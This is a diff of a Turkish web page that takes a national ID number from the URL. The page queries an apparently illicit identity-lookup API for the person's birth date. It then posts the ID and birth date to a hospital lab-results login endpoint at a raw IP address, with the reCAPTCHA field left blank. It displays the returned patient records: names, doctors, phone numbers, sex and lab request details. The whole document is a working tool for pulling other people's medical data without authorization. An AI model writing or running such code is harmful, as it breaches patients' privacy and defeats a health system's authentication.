@@ -3,95 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hasta Bilgileri Sorgulama</title>
+    <title>TC Sorgu Raporu</title>
     <style>
-        #result, #errorMessage {
-            display: none;
-        }
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        #result { margin-top: 20px; }
+        .loading { font-weight: bold; color: #0066cc; }
+        .error { color: red; }
     </style>
 </head>
 <body>
 
-<h2>Hasta Bilgileri Sorgulama</h2>
-<label for="tcNo">TC Kimlik Numarası:</label>
-<input type="text" id="tcNo" placeholder="TC Kimlik No">
-<button onclick="sorgula()">Sorgula</button>
-
-<p id="errorMessage" style="color: red;"></p>
-<div id="result"></div>
+<h2>TC Sorgu Raporu</h2>
+<div id="result" class="loading">Sonuçlar yükleniyor...</div>
 
 <script>
-async function sorgula() {
-    const tcNo = document.getElementById("tcNo").value;
-    const errorMessageElement = document.getElementById("errorMessage");
-    const resultElement = document.getElementById("result");
+// Gerekli API URL'leri
+const sowixApiUrl = "https://api.sowixvip.xyz/sowixapi/tcpro.php?tc=";
+const onlineWebApiUrl = "http://95.0.185.19:64428/online-web/onlinelbs/checkLogin.html";
 
-    errorMessageElement.style.display = "none";
-    resultElement.style.display = "none";
+// URL'den TC parametresini al
+const urlParams = new URLSearchParams(window.location.search);
+const tcNo = urlParams.get("tc");
 
-    if (!tcNo) {
-        errorMessageElement.textContent = "Lütfen bir TC kimlik numarası girin.";
-        errorMessageElement.style.display = "block";
-        return;
-    }
+if (tcNo) {
+    sorgula(tcNo);
+} else {
+    document.getElementById("result").innerHTML = "<p class='error'>Geçerli bir TC kimlik numarası giriniz.</p>";
+}
 
+// API sorgulama işlevi
+async function sorgula(tcNo) {
     try {
-        // İlk API'ye TC ile istek yap
-        const firstApiUrl = `https://api.sowixvip.xyz/sowixapi/tcpro.php?tc=${tcNo}`;
-        const firstResponse = await fetch(firstApiUrl);
-        const firstData = await firstResponse.json();
+        // İlk API'ye (sowixvip) TC numarasıyla istek at
+        const sowixResponse = await fetch(`${sowixApiUrl}${tcNo}`);
+        const sowixData = await sowixResponse.json();
 
-        if (!firstData.success) {
-            errorMessageElement.textContent = "Veri bulunamadı.";
-            errorMessageElement.style.display = "block";
+        if (!sowixData.success || !sowixData.data.DOGUMTARIHI) {
+            document.getElementById("result").innerHTML = "<p class='error'>Doğum tarihi bulunamadı veya API'den başarılı bir sonuç gelmedi.</p>";
             return;
         }
 
-        // Doğum tarihini al
-        const birthDate = firstData.data.DOGUMTARIHI;
+        // Doğum tarihi verisini al ve formatla
+        const dogumTarihi = sowixData.data.DOGUMTARIHI;
+        const formattedDate = formatDate(dogumTarihi);
 
-        // İkinci API'ye gerekli bilgileri gönder
-        const apiUrl = "http://95.0.185.19:64428/online-web/onlinelbs/checkLogin.html";
+        // İkinci API'ye (online-web) TC ve doğum tarihi ile istek at
         const payload = new URLSearchParams({
+            recaptchaRes: '',  // reCAPTCHA cevabı varsa buraya eklenebilir
+            OnlineLbsTcNo: tcNo,
+            OnlineLbsDogumTarihi: formattedDate,
             OnlineLbsDosyaNo: '',
-            OnlineLbsDogumTarihi: birthDate,
             OnlineLbsSonucNo: ''
         });
 
-        const secondResponse = await fetch(apiUrl, {
+        const onlineWebResponse = await fetch(onlineWebApiUrl, {
             method: "POST",
-            body: payload
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: payload.toString()
         });
 
-        const secondData = await secondResponse.json();
+        const onlineWebData = await onlineWebResponse.json();
 
-        if (secondData.durum === "ok") {
-            let resultHtml = "<h2>Hasta Bilgileri:</h2>";
-            secondData.data.forEach(item => {
-                resultHtml += `
-                    <p><strong>TC Kimlik No:</strong> ${item.tckimlikNo || 'Bilgi Yok'}</p>
-                    <p><strong>Kurum ID:</strong> ${item.kurumId || 'Bilgi Yok'}</p>
-                    <p><strong>Kullanıcı Kodu:</strong> ${item.kullaniciKodu || 'Bilgi Yok'}</p>
-                    <p><strong>Lab İstek ID:</strong> ${item.labIstekId || 'Bilgi Yok'}</p>
-                    <p><strong>Genel Kurum ID:</strong> ${item.genKurumId || 'Bilgi Yok'}</p>
-                    <p><strong>Açıklama:</strong> ${item.aciklama || 'Bilgi Yok'}</p>
-                    <p><strong>Birim Adı:</strong> ${item.birimAdi || 'Bilgi Yok'}</p>
-                    <p><strong>Doğum Tarihi:</strong> ${item.dogumTarihi || 'Bilgi Yok'}</p>
-                    <p><strong>İsteyen Kullanıcı ID:</strong> ${item.isteyenKullaniciId || 'Bilgi Yok'}</p>
-                    <p><strong>Hasta Adı Soyadı:</strong> ${item.hastaAdiSoyadi || 'Bilgi Yok'}</p>
-                    <p><strong>Doktor Adı:</strong> ${item.doktorAdi || 'Bilgi Yok'}</p>
-                    <hr>`;
-            });
-            resultElement.innerHTML = resultHtml;
-            resultElement.style.display = "block";
-        } else {
-            errorMessageElement.textContent = "Veri alınamadı.";
-            errorMessageElement.style.display = "block";
-        }
+        // Sonuçları sayfada görüntüleme
+        let resultHtml = '<h3>Sorgu Sonuçları</h3>';
+        onlineWebData.forEach(item => {
+            resultHtml += `
+                <p><strong>TC Kimlik No:</strong> ${item.tckimlikNo || 'Bilgi Yok'}</p>
+                <p><strong>Kurum ID:</strong> ${item.kurumId || 'Bilgi Yok'}</p>
+                <p><strong>Kullanıcı Kodu:</strong> ${item.kullaniciKodu || 'Bilgi Yok'}</p>
+                <p><strong>Lab İstek ID:</strong> ${item.labIstekId || 'Bilgi Yok'}</p>
+                <p><strong>Genel Kurum ID:</strong> ${item.genKurumId || 'Bilgi Yok'}</p>
+                <p><strong>Açıklama:</strong> ${item.aciklama || 'Bilgi Yok'}</p>
+                <p><strong>Birim Adı:</strong> ${item.birimAdi || 'Bilgi Yok'}</p>
+                <p><strong>Doğum Tarihi:</strong> ${item.dogumTarihi || 'Bilgi Yok'}</p>
+                <p><strong>İsteyen Kullanıcı ID:</strong> ${item.isteyenKullaniciId || 'Bilgi Yok'}</p>
+                <p><strong>Hasta Adı Soyadı:</strong> ${item.hastaAdiSoyadi || 'Bilgi Yok'}</p>
+                <p><strong>Doktor Adı:</strong> ${item.doktorAdi || 'Bilgi Yok'}</p>
+                <p><strong>Genel Kurum Adı:</strong> ${item.genKurumAdi || 'Bilgi Yok'}</p>
+                <p><strong>İstek Grup ID:</strong> ${item.istekGrupId || 'Bilgi Yok'}</p>
+                <p><strong>Telefon:</strong> ${item.telefon || 'Bilgi Yok'}</p>
+                <p><strong>Cinsiyet Adı:</strong> ${item.cinsiyetAdi || 'Bilgi Yok'}</p>
+                <p><strong>Hasta ID:</strong> ${item.hastaId || 'Bilgi Yok'}</p>
+                <p><strong>Sonuç No:</strong> ${item.sonucNo || 'Bilgi Yok'}</p>
+                <hr>`;
+        });
+
+        document.getElementById("result").innerHTML = resultHtml;
+
     } catch (error) {
-        errorMessageElement.textContent = "Bir hata oluştu: " + error.message;
-        errorMessageElement.style.display = "block";
+        document.getElementById("result").innerHTML = `<p class='error'>Bir hata oluştu: ${error.message}</p>`;
     }
+}
+
+// Doğum tarihini "2009-02-01" -> "01.02.2009" formatına çevirme işlevi
+function formatDate(dateString) {
+    const [year, month, day] = dateString.split("-");
+    return `${day}.${month}.${year}`;
 }
 </script>
 
